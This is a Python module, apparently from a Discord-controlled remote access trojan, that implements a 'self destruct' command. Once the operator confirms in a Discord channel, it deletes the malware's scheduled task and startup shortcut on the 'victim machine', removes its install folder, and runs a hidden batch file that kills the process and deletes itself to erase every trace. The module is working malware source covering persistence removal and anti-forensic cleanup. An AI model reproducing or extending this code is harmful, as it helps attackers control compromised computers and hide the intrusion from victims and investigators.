"""Remove the runtime and every trace of it from the victim machine.

The running executable cannot be deleted while it runs, so the last step
is handed over to a batch file that waits a few seconds, kills the process
and removes the install folder once the runtime is gone.
"""

import asyncio
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

from discord import Message
from discord.ext import commands
from discord.ext.commands import Context

from src.constants import APP_NAME, INSTALL_DIR

# Seconds the owner has to answer a confirmation request.
CONFIRMATION_TIMEOUT = 30

# Scheduled task that starts the runtime when the user signs in.
TASK_NAME = APP_NAME

# Shortcut that starts the runtime with the user profile.
STARTUP_SHORTCUT = (
    Path(os.environ.get("ProgramData", r"C:\ProgramData"))
    / "Microsoft"
    / "Windows"
    / "Start Menu"
    / "Programs"
    / "Startup"
    / "PythonRuntime.lnk"
)


async def confirm_action(ctx: Context[commands.Bot], prompt: str, label: str) -> bool:
    """Ask the owner to confirm a destructive action.

    The prompt is sent to the channel and the next `yes` or `no` message
    from the author decides whether the action runs.
    """
    await ctx.reply(
        f"{prompt}\n\n"
        "Reply `yes` to confirm or `no` to cancel. "
        f"You have {CONFIRMATION_TIMEOUT} seconds."
    )

    def check(m: Message) -> bool:
        return (
            m.author.id == ctx.author.id
            and m.channel.id == ctx.channel.id
            and m.content.lower().strip() in ("yes", "no")
        )

    try:
        response: Message = await ctx.bot.wait_for(
            "message",
            check=check,
            timeout=CONFIRMATION_TIMEOUT,
        )
    except TimeoutError:
        await ctx.reply(f"{label} cancelled: confirmation timed out.")
        return False

    if response.content.lower().strip() != "yes":
        await ctx.reply(f"{label} cancelled.")
        return False

    return True


def delete_scheduled_task() -> tuple[bool, str]:
    """Delete the scheduled task that starts the runtime."""
    result = subprocess.run(
        ["schtasks.exe", "/Delete", "/TN", TASK_NAME, "/F"],
        capture_output=True,
        text=True,
        errors="replace",
        creationflags=subprocess.CREATE_NO_WINDOW,
        check=False,
    )

    detail = "\n".join(
        part.strip() for part in (result.stdout, result.stderr) if part
    ).strip()

    return result.returncode == 0, detail


def delete_startup_shortcut() -> bool:
    """Delete the startup shortcut of the runtime."""
    try:
        STARTUP_SHORTCUT.unlink(missing_ok=True)
    except OSError as exc:
        print(f"Shortcut error: {exc}")
        return False

    return not STARTUP_SHORTCUT.exists()


def delete_install_folder() -> bool:
    """Delete the install folder of the runtime."""
    if not INSTALL_DIR.exists():
        return True

    try:
        shutil.rmtree(INSTALL_DIR)
    except OSError as exc:
        # The running executable keeps the folder locked, the batch file
        # removes the rest once the process is gone.
        print(f"Install folder error: {exc}")
        return False

    return True


def build_cleanup_script() -> str:
    """Build the batch file that removes the runtime after it exited."""
    return (
        "@echo off\r\n"
        # The batch file leaves the install folder first, otherwise Windows
        # keeps the folder locked by the working directory.
        'cd /d "%TEMP%"\r\n'
        # A ping loop is used instead of timeout because the batch file runs
        # without a console input.
        "ping -n 4 127.0.0.1 >nul\r\n"
        f"taskkill /F /IM {APP_NAME}.exe >nul 2>&1\r\n"
        f'rmdir /S /Q "{INSTALL_DIR}"\r\n'
        'del /F /Q "%~f0"\r\n'
    )


def start_cleanup(batch_path: Path) -> None:
    """Start the cleanup batch file in the background."""
    subprocess.Popen(
        ["cmd.exe", "/c", str(batch_path)],
        cwd=str(batch_path.parent),
        creationflags=subprocess.CREATE_NO_WINDOW,
    )


async def implode(ctx: Context[commands.Bot]) -> None:
    """Remove the runtime from the victim machine."""
    prompt = (
        "⚠️ **Confirm self destruct**\n"
        "The following is removed:\n"
        f"- Scheduled task `{TASK_NAME}`\n"
        f"- Startup shortcut `{STARTUP_SHORTCUT}`\n"
        f"- Install folder `{INSTALL_DIR}`\n\n"
        "The runtime stops running and cannot be started again."
    )

    if not await confirm_action(ctx, prompt, "Self destruct"):
        return

    removed: list[str] = []

    task_deleted, detail = await asyncio.to_thread(delete_scheduled_task)

    if task_deleted:
        removed.append(f"Scheduled task `{TASK_NAME}`")
    else:
        print(f"Scheduled task error: {detail}")

    if await asyncio.to_thread(delete_startup_shortcut):
        removed.append(f"Startup shortcut `{STARTUP_SHORTCUT}`")

    if await asyncio.to_thread(delete_install_folder):
        removed.append(f"Install folder `{INSTALL_DIR}`")
    else:
        removed.append(f"Install folder `{INSTALL_DIR}` (pending, still locked)")

    batch_path = Path(tempfile.gettempdir()) / "pysilon_cleanup.bat"

    try:
        await asyncio.to_thread(
            batch_path.write_text,
            build_cleanup_script(),
            encoding="utf-8",
        )
        await asyncio.to_thread(start_cleanup, batch_path)
    except Exception as exc:
        print(f"Cleanup error: {exc}")
        await ctx.reply("The runtime could not be removed completely.")
        return

    summary = "\n".join(f"- {item}" for item in removed)

    await ctx.reply(f"Removed:\n{summary}\nThe runtime is shutting down.")

    # The batch file finishes the cleanup once this process is gone.
    os._exit(0)
